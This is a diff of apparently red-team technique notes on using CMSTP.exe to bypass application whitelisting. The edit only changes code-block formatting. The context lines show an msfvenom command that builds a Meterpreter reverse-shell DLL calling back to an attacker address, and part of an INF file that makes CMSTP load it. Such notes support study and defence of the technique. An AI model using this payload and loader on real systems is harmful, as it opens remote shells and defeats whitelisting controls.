@@ -8,18 +8,15 @@ description: CMSTP code execution - bypass application whitelisting.
 
 Generating the a reverse shell payload as a DLL:
 
-{% code-tabs %}
-{% code-tabs-item title="evil.dll" %}
+{% code title="evil.dll" %}
 ```csharp
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 Creating a file that will be loaded by CSMTP.exe binary that will in turn load our evil.dll:
 
-{% code-tabs %}
-{% code-tabs-item title="f.inf" %}
+{% code title="f.inf" %}
 ```csharp
 [version]
 Signature=$chicago$
@@ -36,8 +33,7 @@ AppAct = "SOFTWARE\Microsoft\Connection Manager"
 ServiceName="mantvydas"
 ShortSvcName="mantvydas"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 Invoking the payload:
 
